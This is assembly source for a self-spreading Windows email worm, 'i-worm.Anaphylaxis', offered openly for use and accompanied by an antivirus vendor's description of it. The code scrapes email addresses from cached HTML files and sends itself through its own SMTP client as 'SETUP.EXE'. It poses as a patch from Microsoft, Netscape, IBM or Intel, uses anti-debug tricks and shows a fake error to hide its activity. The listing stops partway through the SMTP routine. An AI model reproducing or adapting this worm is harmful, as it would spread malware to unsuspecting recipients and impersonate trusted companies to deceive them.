;
;   i-worm.Anaphylaxis
;   coded by Bumblebee/29a
;
;   Disclaimer
;   ~~~~~~~~~~
;  This  is the  source  of  a I-WORM.  Feel free to use at  your will.
; Notice  that  the  author is not  responsabile  of the  damages  that
; may occur due to the assembly of  this file.
;
;   About Anaphylaxis
;   ~~~~~~~~~~~~~~~~~
;  Almost all of us have a fear of being stung  by a bee or wasp.  This
; fear may stem from the  pain often associated with the  sting or from
; the  knowledge  that such a  sting may be  life threatening  for some
; people.  The statistics show that approximately 40-100 people die per
; year in the USA from insect sting anaphylaxis.  This gives an overall
; incidence  of  0.4-3%  of  the American  population.  The majority of
; stings occur  in those under 20yrs,  but the majority of deaths occur
; in adults due to the profound physiologic changes that can occur with
; anaphylaxis.  Almost all physicians are aware of the severe reactions
; that can occur  with venom  hypersensitivity, but many are unaware of
; the options a patient may have for treatment.
;
;  Normally some redness and swelling  will result  from the sting, but
; his usually resolves in a few hours.
;  In the allergic individual,  a more long lasting and severe reaction
; will occur.  A mild reaction will i nclude intense  redness, swelling
; spanning two joints, itching and  pain all  occuring  within minutes.
; More severe  reactions  include  generalised  swelling  and  itching,
; faintness, sweating, a pounding headache, stomach cramps or vomiting,
; a feeling of impending doom,  a tight chest or choking sensation with
; swellin of the throat  and in extreme cases  anaphylactic  shock with
; death resulting.
;
;  Words of the Author
;  ~~~~~~~~~~~~~~~~~~~
;  .This is my  first contribution to  29a's zine as member: an i-worm.
; Implements its oun SMTP client and uses WinSockets  to send e-mail to
; other machines.
;
;  .The problem of this  (and i think all) i-worms is to find addresses
; to send  the worm. This  worm has a  point for: it doesn't needs  any
; program  to spread  due to it has all  that is needed. As ever i code
; a virus i thought: what i usually do? And i found addresses into html
; files.  Where  i have  html files?  Into temp  and  personal folders.
; The cache of both  Internet Explorer and  Netscape  are cool too. But
; i want to be  independent (and someone knows how to  find the folders
; into 'temporary internet files'? findf and findn doesn't work...)  so
; these folders are safe (may be next time ;).
;
;  .Everybody  remembers the Melissa  issue...  so i  only send  to the
; first  mail i  found  in each  html and  only 10. I don't  want to be
; a problem for goverments ;)
;
;  .Another feature is the mail body. I used MIME 1.0 extensions  to do
; the attachment  and base64  encoding for the  file. I tried to do the
; message a bit  polymorphic (the  sender changes  each time), but  the
; main is static.
;
;       Subject: Patch
;
;          This is the patch you asked for.
;
;  If this mail arrives form Microsoft, Netscape, IBM or Intel... hehe.
; The sender changes, but the implementation of HELO command of SMTP is
; needed for most servers... due to this it's not really anonymous. But
; don't care, this information (if avaliable) it's placed in the header
; and user usually don't see it.
;
;  .The sockets are  blocking.  This means the program block if reading
; from a socket  'till is data avaliable for reading.  If somethig goes
; wrong the proces can became ZOMBIE (I love Linux).  So i use a thread
; to send the mail  and the main process  wait until some secs.  If the
; thread doesn't end its work by itself, i terminate it.
;
;  .I've included a simple but cool  anti-debug trick to avoid the worm
;  to be debugged.  SEH included too  (but not needed,  there are not a
;  host to return execution).
;
;  .This code is very damn complex. Nothing optimized and not very good
;  commented. Is a hard work to do it with ASM (the SMTP client i mean)
;  and the test part is a... i'm happy to see it's finished.  Have fun!
;
;  Thanx to:
;       Darkman, Virus Buster and Clau for their help testing this
;       worm.  Griyo for the idea of the thread.  And thanx to all
;       those webmasters with so old SMTP servers ;)
;
;                                                    The way of the bee
;
;
; From AVPE:
;
;I-Worm.Anap
;
;---------------------------------------------------------------------
;This is a worm virus spreading via the Internet. The worm itself is a
;Windows  EXE file about 16Kb of length. It is transferred via the net
;in email messages as an infected attachment with the name SETUP.EXE.
;When such message is received  and the attached EXE file is executed,
;the worm gets control and starts its spreading routine.  This routine
;scans Windows temporary  file and Explorer personal folder ("My Docu-
;ments" as default) for HTML and HTTP files,  scans them and  searches
;for email addresses in files' body. When such addresses  are located,
;the worm connects to the network by using the SMTP protocol and sends
;its copy to these email addresses.  The worm sends its copy up to ten
;times (addresses) on each start. It does not install itself  into the
;system and is executed only once - that is,  when the user  activates
;the  file attached to  the infected message.  So, comparing  to other
; Internet worms known at the moment, this worm is a sample of a "non-
;resident, direct action" Internet Worm.
;
;While generating an infected email the worm fills-in the fields.  The
;"from:" field has three parts, each of part is randomly selected from
; variants:
;
;  Jhon Mark Bill Frank Sam Eva Carla Joan Jean Sophie
;  M. C. T. R.
;  Smith Woodruf Brown Steel Driver Seldon Forge Stab McAndrew Gregor
;
;for example, "from: Sam T. Brown". The "mail from:" field is randomly
;selected from five variants:
;
;  <support@microsoft.com> <support@netscape.com> <support@pc.ibm.com>
;  <support@ibm.com> <support@intel.com>
;
;The "Subject" field contains just one word: "Patch".  The message it-
;self contains the text:
;
;  This is the patch you asked for.
;
;To hide its activity the worm  displays a  fake error message  at the
;end of its work:
;
; Setup
;   Integrity check failed due to:
;   bad data transmision or bad disk access.
; 
; On 5th of any month the worm also displays the message:
;
; i-worm.Anaphylaxis coded by Bumblebee/29a
;
;   .This is an i-worm.  Don't worry, this is not a virus.  But may occur the
;   worm has been infected by a virus during its travel and both arrived to
;   your computer.
;                                                       The way of the bee
; 
; --------------------------------------------------------------------------

.486p
locals
jumps
.model flat,STDCALL

include wsocks.inc                              ; includes the wsock stuff

        extrn   MessageBoxA:PROC

        extrn           ExitProcess:PROC        ; wooooooah
        extrn               lstrcpy:PROC
        extrn               lstrcat:PROC
        extrn        FindFirstFileA:PROC
        extrn         FindNextFileA:PROC
        extrn             FindClose:PROC
        extrn          GetTempPathA:PROC
        extrn                _lread:PROC
        extrn    CreateFileMappingA:PROC
        extrn         MapViewOfFile:PROC
        extrn       UnmapViewOfFile:PROC
        extrn           CreateFileA:PROC
        extrn           CloseHandle:PROC
        extrn           GetFileSize:PROC
        extrn      RegQueryValueExA:PROC
        extrn         RegOpenKeyExA:PROC
        extrn          VirtualAlloc:PROC
        extrn       GetCommandLineA:PROC
        extrn          GetTickCount:PROC
        extrn        GetDateFormatA:PROC
        extrn          CreateThread:PROC
        extrn            ExitThread:PROC
        extrn       TerminateThread:PROC
        extrn         GetSystemTime:PROC


; from BC++ Win32 API on-line Reference
WIN32_FIND_DATA         struc
dwFileAttributes        dd      0
dwLowDateTime0          dd      ?       ; creation
dwHigDateTime0          dd      ?
dwLowDateTime1          dd      ?       ; last access
dwHigDateTime1          dd      ?
dwLowDateTime2          dd      ?       ; last write
dwHigDateTime2          dd      ?
nFileSizeHigh           dd      ?
nFileSizeLow            dd      ?
dwReserved              dd      0,0
cFileName               db      260 dup(0)
cAlternateFilename      db      14 dup(0)
                        db      2 dup(0)
WIN32_FIND_DATA         ends

        PORT            equ             25      ; port to connect

.DATA

; client stuff --------------------------------------------------------------
wsadata         WSADATA <0>                     ; for wsocks install check
sockaddr        SOCKADDR <0>                    ; for connection
sizeOfSockaddr  equ     SIZE SOCKADDR
fd              dd      0                       ; handle for the socket
response        dd      0                       ; for server response
responseb       db      0                       ; for server response

myHostSize      equ     160                     ; for HELO
heloCmd         db      'helo '
myHost          db      myHostSize+2 dup(0)
heloSize        dd      0

server          db      160 dup(0)              ; name of the server
                                                ; the client session
cmd0            db      'mail from:'            ; MAIL
cmdFrom         db      160 dup(0)
sizeCmd0        equ     offset $-offset cmd0
cmd1            db      'rcpt to:'              ; RCPT
cmdTo           db      160 dup(0)
sizeCmd1        equ     offset $-offset cmd1
cmd2            db      'data',0dh,0ah          ; DATA
sizeCmd2        equ     offset $-offset cmd2
cmd4            db      'quit',0dh,0ah          ; QUIT
sizeCmd4        equ     offset $-offset cmd4

cmd             dd      cmd0,sizeCmd0,cmd1,sizeCmd1,cmd2,sizeCmd2
                dd      0,0,cmd4,sizeCmd4       ; hehe. void **
nCmd            dd      5
; ---------------------------------------------------------------------------

; find html files stuff -----------------------------------------------------
tempPath                db      260 dup(0)      ; to store paths
tempPaths               equ     260             ; max size
find_data               WIN32_FIND_DATA <?>     ; for finf and findn
searchPath              db      260 dup(0)      ; to store TEMP path
fmask                   db      '*.ht*',0       ; mask to find html files

ffHnd                   dd      0               ; for findf and findn
; --------------------------------------------------------------------------

; search mail stuff --------------------------------------------------------
mailto                  db      'mailto:'       ; string to found
mailtoSize              equ     offset $-offset mailto
mailFlag                db      0               ; the mail is correct?
mail0                   db      128 dup (0)     ; to store e-mail
mail1                   db      128 dup (0)     ; to store e-mail
mail2                   db      128 dup (0)     ; to store e-mail
mail3                   db      128 dup (0)     ; to store e-mail
mail4                   db      128 dup (0)     ; to store e-mail
mail5                   db      128 dup (0)     ; to store e-mail
mail6                   db      128 dup (0)     ; to store e-mail
mail7                   db      128 dup (0)     ; to store e-mail
mail8                   db      128 dup (0)     ; to store e-mail
mail9                   db      128 dup (0)     ; to store e-mail
mailxRef                dd      offset mail0,offset mail1,offset mail2 
                        dd      offset mail3,offset mail4,offset mail5
                        dd      offset mail6,offset mail7,offset mail8
                        dd      offset mail9
endMailxRef             equ     9*4
mailCount               dd      0
; --------------------------------------------------------------------------

; shared data --------------------------------------------------------------
fHnd                    dd      0               ; file handle
mfHnd                   dd      0               ; mapped file handle
flag                    db      0               ; guess...
commandLine             dd      0               ; mmm
smHnd                   dd      0               ; memory handle
mapOVHnd                dd      0               ; i can't remeber ;)
fileSize                dd      0               ; hohoho
; --------------------------------------------------------------------------

; registry stuff -----------------------------------------------------------
HKEY_LOCAL_MACHINE      equ     80000001h
regPath                 db      'Software\Microsoft\Windows\CurrentVersion'
                        db      '\Explorer\Shell Folders',0
requestedValue          db      'Personal',0
PersonalP               db      128 dup(0)
PersonalPs              dd      128
keyHnd                  dd      0
; --------------------------------------------------------------------------

; This data is required to encode into Base64 -------------------------------
encTable        db      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv'
                db      'wxyz0123456789+/'
; The required data to encode into Base64 ends here -------------------------

; data to genmail -----------------------------------------------------------
dateBuffs       equ     32                      ; the date for the mail
dateBuff        db      dateBuffs dup(0)
dateFormat      db      'MM/dd/yy',0

sdate           db      6,'Date: '
sfrom           db      5,'From:'
ssubject        db      16,'Subject: Patch',0dh,0ah
messbody        db      'MIME-Version: 1.0',0dh,0ah
                db      'Message-ID: <a1234>',0dh,0ah
                db      'Content-Type: multipart/mixed; boundary="a1234"',0dh,0ah
                db      0dh,0ah,'--a1234',0dh,0ah
                db      'Content-Type: text/plain; charset=us-ascii',0dh,0ah
                db      'Content-Transfer-Encoding: 7bit',0dh,0ah,0dh,0ah
                db      '   This is the patch you asked for.',0dh,0ah
                db      0dh,0ah
                db      0dh,0ah,'--a1234',0dh,0ah
                db      'Content-Type: application/octet-stream; name="SETUP.EXE"'
                db      0dh,0ah,'Content-Transfer-Encoding: base64',0dh,0ah
                db      'Content-Disposition: attachment; filename="SETUP.EXE"'
                db      0dh,0ah,0dh,0ah,0
messEnd         db      0dh,0ah,'--a1234--',0dh,0ah,0dh,0ah,0

; some names
name0           db      5,' Jhon'
name1           db      5,' Mark'
name2           db      5,' Bill'
name3           db      6,' Frank'
name4           db      4,' Sam'
name5           db      4,' Eva'
name6           db      6,' Carla'
name7           db      5,' Joan'
name8           db      5,' Jean'
name9           db      7,' Sophie'
nameRef         dd      offset name0,offset name1,offset name2,offset name3
                dd      offset name4,offset name5,offset name6,offset name7
                dd      offset name8,offset name9

; some middle names
mname0          db      1,' '
mname1          db      4,' M. '
mname2          db      4,' C. '
mname3          db      4,' T. '
mname4          db      4,' R. '
mnameRef        dd      offset mname0,offset mname1,offset mname2,offset mname3
                dd      offset mname4

; some 'apellidos' ;)
sname0          db      7,'Smith <'
sname1          db      9,'Woodruf <'
sname2          db      7,'Brown <'
sname3          db      7,'Steel <'
sname4          db      8,'Driver <'
sname5          db      8,'Seldon <'
sname6          db      7,'Forge <'
sname7          db      6,'Stab <'
sname8          db      10,'McAndrew <'
sname9          db      8,'Gregor <'
snameRef        dd      offset sname0,offset sname1,offset sname2,offset sname3
                dd      offset sname4,offset sname5,offset sname6,offset sname7
                dd      offset sname8,offset sname9

; some 'from' servers
smail0s         equ     offset smail1-offset smail0-1
smail0          db      smail0s,'support@microsoft.com>',0dh,0ah

smail1s         equ     offset smail2-offset smail1-1
smail1          db      smail1s,'support@netscape.com>',0dh,0ah

smail2s         equ     offset smail3-offset smail2-1
smail2          db      smail2s,'support@pc.ibm.com>',0dh,0ah

smail3s         equ     offset smail4-offset smail3-1
smail3          db      smail3s,'support@ibm.com>',0dh,0ah

smail4s         equ     offset smailRef-offset smail4-1
smail4          db      smail4s,'support@intel.com>',0dh,0ah

smailRef        dd      offset smail0,offset smail1,offset smail2,offset smail3
                dd      offset smail4

commandLineOk   db      260 dup(0)              ; fixed command line
; ---------------------------------------------------------------------------

; Thread Stuff --------------------------------------------------------------
threadId0       dd      0                       ; thead handle
thrSem          db      0                       ; thread is working?
; ---------------------------------------------------------------------------

; a payload...
btitle          db      'i-worm.Anaphylaxis coded by Bumblebee/29a',0
mess            db      0ah,' .This is an i-worm.  Don''t worry, this is not a virus.  But may occur the'
                db      0ah,'worm has been infected by a virus during its travel and both arrived to '
                db      0ah,'your computer.',0ah
                db      09h,09h,09h,09h,'        The way of the bee',0ah,0
sysTimeStruct   db      16 dup(0)

; stealth (huahuahua)
btitle0         db      'Setup',0
mess0           db      'Integrity check failed due to:',0dh,0ah,0dh,0ah
                db      09h,'bad data transmision or bad disk access.'
                db      0dh,0ah,0

.CODE

inicio:
        lea     eax,dword ptr [esp-8h]          ; enable exception handling
        xor     esi,esi
        xchg    eax,dword ptr fs:[esi]
        lea     edi,exception
        push    edi
        push    eax

        call    antidebug                       ; cool effect of SEH with
antidebug:                                      ; debuggers
        add     esp,4
        cmp     esi,dword ptr fs:[esi+20h]      ; anti-debug
        je      notDebug

fool0:
        wbinvd                                  ; hahahahaha
        call    fool0

notDebug:
        push    offset sysTimeStruct            ; check for payload
        call    GetSystemTime

        lea     eax,sysTimeStruct               ; check for date
        cmp     word ptr [eax+6],5
        jne     skipPay

        push    1000h
        push    offset btitle
        push    offset mess
        push    0h
        call    MessageBoxA
        jmp     fool0

skipPay:
        push    offset wsadata
        push    VERSION1_1
        call    WSAStartup                      ; check wsocks installation
        cmp     eax,0
        jne     qException

        mov     ax,VERSION1_1
        cmp     ax,word ptr [wsadata.mVersion]
        jne     exitAppQsocks                   ; test version

        push    offset keyHnd                   ; open the registry key
        push    0                               ; about explorer
        push    0
        push    offset regPath
        push    HKEY_LOCAL_MACHINE
        call    RegOpenKeyExA
        cmp     eax,0
        jne     exitAppQsocks

        push    offset PersonalPs               ; get personal path
        push    offset PersonalP                ; directory
        push    0
        push    0
        push    offset requestedValue
        push    dword ptr [keyHnd]
        call    RegQueryValueExA

        lea     esi,PersonalP
        add     esi,dword ptr [PersonalPs]
        mov     byte ptr [esi-1],'\'
        mov     byte ptr [esi],0

        push    offset tempPath                 ; get temp directory
        push    tempPaths
        call    GetTempPathA
        cmp     eax,0
        je      exitAppQsocks

        xor     ebp,ebp                         ; counter for mails

find1st:
        push    offset tempPath                 ; copy path
        push    offset searchPath 
        call    lstrcpy

        push    offset fmask
        push    offset searchPath               ; make mask for findf
        call    lstrcat                         ; and findn

        push    offset find_data                ; we get 1st directory
        push    offset searchPath               ; from cache to get
        call    FindFirstFileA                  ; html files there
        cmp     eax,-1
        jne     oneFound

        cmp     byte ptr [flag],0
        je      endOfQuest

        cmp     ebp,0
        je      exitAppQsocks

        jmp     endOfQuest2

oneFound:
        mov     dword ptr [ffHnd],eax           ; save handle
fnext:
        push    offset tempPath                 ; copy path
        push    offset searchPath 
        call    lstrcpy

        push    offset find_data.cFileName
        push    offset searchPath               ; make filename to
        call    lstrcat                         ; scan

        lea     edi,searchPath
        lea     edx,mailxRef
        mov     edx,dword ptr [edx+ebp]
        call    scanFile                        ; scan!
        jc      contSearchDir

        add     ebp,4                           ; next mail
        cmp     ebp,endMailxRef
        ja      endOfQuest                      ; 10 mails yet?

contSearchDir:
        push    offset find_data                ; find next
        push    dword ptr [ffHnd]
        call    FindNextFileA
        cmp     eax,0
        jne     fnext

closeFindHandle:

        mov     dword ptr [mailCount],ebp

        push    dword ptr [ffHnd]               ; close handle
        call    FindClose

        cmp     byte ptr [flag],0
        jne     endOfQuest2
        mov     byte ptr [flag],1

        push    offset PersonalP                ; copy path
        push    offset tempPath 
        call    lstrcpy

        jmp     find1st

endOfQuest:
        mov     byte ptr [flag],1
        jmp     closeFindHandle

endOfQuest2:
        xor     ebp,ebp

        call    GetCommandLineA                 ; get command line
        mov     dword ptr [commandLine],eax

skipArgs:                                       ; skip args
        cmp     dword ptr [eax],'EXE.'
        je      argsOk
        inc     eax
        jmp     skipArgs
argsOk:
        add     eax,4
        mov     byte ptr [eax],0

        cld
        mov     esi,dword ptr [commandLine]
        lea     edi,commandLineOk

otherThis:
        cmp     byte ptr [esi],'"'
        je      skipThisChar
        cmp     byte ptr [esi],0
        je      endSkipThis
        movsb
        jmp     otherThis
skipThisChar:
        inc     esi
        jmp     otherThis
endSkipThis:
        movsb

        push    00000000h
        push    00000080h
        push    00000003h
        push    00000000h
        push    00000001h
        push    80000000h
        push    offset commandLineOk
        call    CreateFileA                     ; open file 
        cmp     eax,-1                          ; read shared
        pop     edx
        je      scanFileErrorB

        mov     dword ptr [fHnd],eax            ; save file handle

        push    0h
        push    eax
        call    GetFileSize
        cmp     eax,-1
        je      scanFileErrorCloseB

        mov     dword ptr [fileSize],eax        ; save file size

        add     eax,3

        push    00000004h                       ; read/write page
        push    00001000h                       ; mem commit
        push    eax                             ; size to alloc
        push    0h                              ; system decide where
        call    VirtualAlloc
        cmp     eax,0
        je      noMem
        mov     dword ptr [mapOVHnd],eax

        push    dword ptr [fileSize]
        push    eax
        push    dword ptr [fHnd]
        call    _lread
        cmp     eax,dword ptr [fileSize]
        jne     scanFileErrorCloseB

        mov     eax,dword ptr [fileSize]        ; memory to alloc
        add     eax,1024
        mov     ecx,2
        xor     edx,edx
        mul     ecx

        push    00000004h                       ; read/write page
        push    00001000h                       ; mem commit
        push    eax                             ; size to alloc
        push    0h                              ; system decide where
        call    VirtualAlloc
        cmp     eax,0
        je      noMem
        mov     dword ptr [smHnd],eax

genNext:
        mov     edi,dword ptr [smHnd]
        mov     dword ptr [cmd+24],edi          ; store address
        lea     esi,mailxRef
        mov     esi,dword ptr [esi+ebp]
        call    genMessage
        push    eax

        mov     dword ptr [cmd+28],eax          ; store size

        push    offset threadId0                ; creates the thread
        push    0h                              ; ahh... where is fork() ?
        push    0h                              ; why microshit loves
        push    offset thread                   ; wired stuff ?
        push    0h                              ; there are a lot of
        push    0h                              ; questions in the life...
        call    CreateThread
        cmp     eax,0
        je      threadEnds

        call    GetTickCount                    ; wait some time for
        mov     edx,eax                         ; the server
        add     edx,45000                       ; 45 secs
        inc     byte ptr [thrSem]
waitLoop:
        push    edx
        call    GetTickCount
        pop     edx
        cmp     eax,edx
        ja      threadTimeOut
        cmp     byte ptr [thrSem],0             ; thread ended by its own
        jne     waitLoop
        jmp     threadEnds
threadTimeOut:
        push    0h
        push    dword ptr [threadId0]
        call    TerminateThread
threadEnds:
        mov     byte ptr [thrSem],0

        add     ebp,4
        cmp     ebp,dword ptr [mailCount]
        pop     eax
        je      scanFileErrorCloseB
        push    eax

        jmp     genNext

noMem:
scanFileErrorCloseB:
        push    dword ptr [fHnd]                ; close the file
        call    CloseHandle

scanFileErrorB:

exitAppQsocks:
        call    WSACleanup                      ; end wsocks use
        jmp     qException

exception:                                      ; SEH is not really needed
        xor     esi,esi                         ; only for anti-debug
        mov     eax,dword ptr fs:[esi]
        mov     esp,dword ptr [eax]
qException:
        xor     esi,esi
        pop     dword ptr fs:[esi]              ; disable exception
        pop     eax                             ; handling

        push    1000h                           ; stealth message
        push    offset btitle0
        push    offset mess0
        push    0h
        call    MessageBoxA

        push    0h                              ; exit app
        call    ExitProcess


;
;       Gets e-mail from html if avaliable.
;
scanFile:
        mov     byte ptr [mailFlag],0

        push    edx
                                                ; three steps into micro$hit
        push    00000000h                       ; example of confusing API:
        push    00000080h
        push    00000003h
        push    00000000h
        push    00000001h
        push    80000000h
        push    edi                             ; 1st step:
        call    CreateFileA                     ; open file for the mapping
        cmp     eax,-1                          ; read shared
        pop     edx
        je      scanFileError

        mov     dword ptr [fHnd],eax            ; save file handle

        push    edx
        push    0h
        push    eax
        call    GetFileSize                     ; needed to know the
        cmp     eax,-1                          ; high limit
        pop     edx
        je      scanFileErrorClose

        cmp     eax,100h                        ; erm... file too much
        jb      scanFileErrorClose              ; small

        mov     ebx,eax
        sub     ebx,mailtoSize                  ; sub mailto size
                                                ; for better search
        push    ebx edx
        pop     ebx edx
        
        push    edx ebx
        push    00000000h
        push    00000000h
        push    00000000h
        push    00000002h
        push    00000000h
        push    dword ptr [fHnd]                ; 2nd step:
        call    CreateFileMappingA              ; create a mapping file
        pop     ebx edx
        cmp     eax,0                           ; for read-only
        je      scanFileErrorClose

        mov     dword ptr [mfHnd],eax           ; save mapped file handle

        push    edx ebx
        push    00000000h
        push    00000000h
        push    00000000h
        push    00000004h
        push    eax                             ; 3rd step:
        call    MapViewOfFile                   ; create map view (for read)
        cmp     eax,0
        pop     ebx edx
        je      scanFileErrorCloseMap

        mov     edi,eax                         ; store adress into edi
        add     edx,edi
        mov     ecx,mailtoSize
        lea     esi,mailto                      ; get mailto string addr

        cld
scanFileLoop:                                   ; here comes the 'search
        push    ecx                             ; algo'
        push    esi
        push    edi

        rep     cmpsb
        pop     edi
        pop     esi
        pop     ecx

        je      scanFileFound
        inc     edi
        cmp     edi,edx
        jae     scanFileNotFound
        jmp     scanFileLoop

scanFileNotFound:
        push    eax
        call    UnmapViewOfFile                 ; delete map view

scanFileErrorCloseMap:
        push    dword ptr [mfHnd]               ; close the mapped file
        call    CloseHandle

scanFileErrorClose:
        push    dword ptr [fHnd]                ; close the file
        call    CloseHandle

scanFileError:
        stc
        ret

scanFileFound:
        mov     esi,edi                         ; now comes 'get e-mail'
        add     esi,mailtoSize                  ; algo
        mov     edi,ebx
        cld
nextChar:
        cmp     edx,esi
        jbe     scanFileNotFound

        cmp     byte ptr [esi],' '
        je      skipChar
        cmp     byte ptr [esi],'"'
        je      endChar
        cmp     byte ptr [esi],''''
        je      endChar
        cmp     byte ptr [esi],'@'
        jne     notFoundSep
        mov     byte ptr [mailFlag],1
notFoundSep:
        movsb
        jmp     nextChar
skipChar:
        inc     esi
        jmp     nextChar
endChar:
        mov     byte ptr [edi],0

        push    eax
        call    UnmapViewOfFile                 ; delete map view

        push    dword ptr [mfHnd]               ; close the mapped file
        call    CloseHandle

        push    dword ptr [fHnd]                ; close the file
        call    CloseHandle
                                                ; sometimes is better to
                                                ; alloc mem and do it in
                                                ; a more classic way...
        cmp     byte ptr [mailFlag],1
        jne     wrongMailAddress
        clc
        ret
wrongMailAddress:
        stc
        ret
;
; generates a message for the mail
;
genMessage:
        push    edi
        push    esi

        push    dateBuffs
        push    offset dateBuff
        push    offset dateFormat
        push    0
        push    0
        push    0
        call    GetDateFormatA

        cld
        xor     ecx,ecx
        mov     cl,byte ptr [sdate]
        lea     esi,sdate+1
        rep     movsb

        lea     esi,dateBuff
date0:
        cmp     byte ptr [esi],0
        je      date1
        movsb
        jmp     date0

date1:
        mov     word ptr [edi],0a0dh
        add     edi,2

        xor     ecx,ecx
        mov     cl,byte ptr [sfrom]
        lea     esi,sfrom+1
        rep     movsb

other0:
        call    GetTickCount
        and     al,00001111b
        cmp     al,9
        ja      other0

        lea     esi,nameRef
        and     eax,000000ffh
        xor     edx,edx
        mov     cl,4
        mul     cl
        add     esi,eax
        mov     esi,dword ptr [esi]

        xor     ecx,ecx
        mov     cl,byte ptr [esi]
        inc     esi
        rep     movsb

other1:
        call    GetTickCount
        and     al,00001111b
        cmp     al,4
        ja      other1

        lea     esi,mnameRef
        and     eax,000000ffh
        xor     edx,edx
        mov     cl,4
        mul     cl
        add     esi,eax
        mov     esi,dword ptr [esi]

        xor     ecx,ecx
        mov     cl,byte ptr [esi]
        inc     esi
        rep     movsb

other2:
        call    GetTickCount
        and     al,00001111b
        cmp     al,9
        ja      other2

        lea     esi,snameRef
        and     eax,000000ffh
        xor     edx,edx
        mov     cl,4
        mul     cl
        add     esi,eax
        mov     esi,dword ptr [esi]

        xor     ecx,ecx
        mov     cl,byte ptr [esi]
        inc     esi
        rep     movsb

other3:
        call    GetTickCount
        and     al,00001111b
        cmp     al,4
        ja      other3

        lea     esi,smailRef
        and     eax,000000ffh
        xor     edx,edx
        mov     cl,4
        mul     cl
        add     esi,eax
        mov     esi,dword ptr [esi]

        push    esi edi                         ; store From
        lea     edi,cmdFrom
        mov     byte ptr [edi],'<'
        inc     edi
        xor     ecx,ecx
        mov     cl,byte ptr [esi]
        inc     esi
        push    ecx
        rep     movsb
        pop     ecx
        add     ecx,(offset cmdFrom-offset cmd0)+1
        mov     dword ptr [cmd+4],ecx
        pop     edi esi

        xor     ecx,ecx
        mov     cl,byte ptr [esi]
        inc     esi
        rep     movsb

        xor     ecx,ecx
        mov     cl,byte ptr [ssubject]
        lea     esi,ssubject+1
        rep     movsb

        mov     dword ptr [edi],' :oT'
        add     edi,4
        pop     esi

        push    esi edi                         ; store the server
        lea     edi,server
searchThe@:
        inc     esi
        cmp     byte ptr [esi],'@'
        jne     searchThe@
        inc     esi
storeServer:
        cmp     byte ptr [esi],0
        je      storeServerEnd
        movsb
        jmp     storeServer
storeServerEnd:
        movsb
        pop     edi esi

        push    esi edi                         ; store To
        lea     edi,cmdTo
        mov     byte ptr [edi],'<'
        inc     edi
        xor     ecx,ecx
storeTo0:
        cmp     byte ptr [esi],0
        je      storeTo1
        movsb
        inc     ecx
        jmp     storeTo0
storeTo1:
        add     ecx,(offset cmdTo-offset cmd1)+4
        mov     byte ptr [edi],'>'
        mov     word ptr [edi+1],0a0dh
        mov     dword ptr [cmd+12],ecx
        pop     edi esi

other4:
        cmp     byte ptr [esi],0
        je      other5
        movsb
        jmp     other4

other5:
        mov     word ptr [edi],0a0dh
        add     edi,2

        lea     esi,messbody
other6:
        cmp     byte ptr [esi],0
        je      other7
        movsb
        jmp     other6

other7:
        push    esi
        mov     eax,dword ptr [fileSize]
        xor     edx,edx
        mov     ecx,3
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx
        mov     ecx,eax
        mov     edx,edi
        mov     eax,dword ptr [mapOVHnd]
        call    encodeBase64
        pop     esi

        mov     edi,edx

        mov     word ptr [edi],0a0dh
        add     edi,2

        lea     esi,messEnd
endm0:
        cmp     byte ptr [esi],0
        je      endm1
        movsb
        jmp     endm0
endm1:

        mov     word ptr [edi],0a0dh
        add     edi,2
        mov     byte ptr [edi],'.'
        inc     edi
        mov     word ptr [edi],0a0dh
        add     edi,2

        pop     ecx
        sub     edi,ecx
        mov     eax,edi
        ret

;
; encodeBase64 by Bumblebee. All rights reserved ;)
; Feel free to modify and distribute this code.
; Size of data to encode must be: (size mod 3)=0!
; I don't do padding :(
;
; in:   eax address of data to encode
;       edx address to put encoded data
;       ecx size of data to encode
;
; out:  ecx size of encoded data
;
encodeBase64:
        xor     esi,esi
        lea     edi,encTable
        push    ebp
        xor     ebp,ebp
baseLoop:

        xor     ebx,ebx
        mov     bl,byte ptr [eax]
        shr     bl,2
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        mov     bx,word ptr [eax]
        xchg    bl,bh
        shr     bx,4
        mov     bh,0
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        inc     eax
        mov     bx,word ptr [eax]
        xchg    bl,bh
        shr     bx,6
        mov     bh,0
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        inc     eax
        xor     ebx,ebx
        mov     bl,byte ptr [eax]
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi
        inc     eax

        inc     ebp
        cmp     ebp,24
        ja      addEndOfLine
        inc     ebp

addedEndOfLine:
        sub     ecx,3
        cmp     ecx,0
        jne     baseLoop

        mov     ecx,esi
        add     edx,esi
        pop     ebp
        ret

addEndOfLine:
        xor     ebp,ebp
        mov     word ptr [edx+esi],0a0dh
        add     esi,2
        jmp     addedEndOfLine

;
; This is the SMTP client. It's nice. I think you can undertand it.
; Look at internet standards (RFC821/RFC822 if i'm right...)
;
thread:
        push    PCL_NONE
        push    SOCK_STREAM
        push    AF_INET
        call    socket                          ; open a socket
        cmp     eax,SOCKET_ERR
        je      exitThrQsocksC

        mov     dword ptr [fd],eax              ; save the socket

        push    myHostSize
        push    offset myHost
        call    gethostname                     ; get host for helo
        cmp     eax,0
        jne     exitThrQsocksC

        lea     edi,heloCmd
mHeloLoop:
        cmp     byte ptr [edi],0
        je      heloDone
        inc     edi
        jmp     mHeloLoop
heloDone:
        mov     word ptr [edi],0a0dh
        add     edi,2
        mov     ecx,edi
        sub     ecx,offset heloCmd
        mov     dword ptr [heloSize],ecx
                                                ; now fill the sockaddr
                                                ; for connection
        mov     word ptr [sockaddr.sin_family],AF_INET

        push    offset server
        call    gethostbyname                   ; get the hostent struct
        cmp     eax,0
        je      exitThrQsocksC

        mov     eax,dword ptr [eax+HOSTENT_IP]
        mov     eax,dword ptr [eax]
        mov     dword ptr [sockaddr.sin_addr],eax

        push    PORT
        call    htons                           ; get port in network byte
        mov     word ptr [sockaddr.sin_port],ax ; order

        push    sizeOfSockaddr
        push    offset sockaddr
        push    dword ptr [fd]
        call    connect                         ; connect now!
        cmp     ax,SOCKET_ERR
        je      exitThrQsocksC

        mov     eax,dword ptr [fd]
        call    SResponse                       ; get server response
        cmp     eax,SOCKET_ERR                  ; to connection
        je      exitThrQsocksC
        cmp     eax,' 022'
        jne     exitThrQsocksC        

        lea     esi,heloCmd
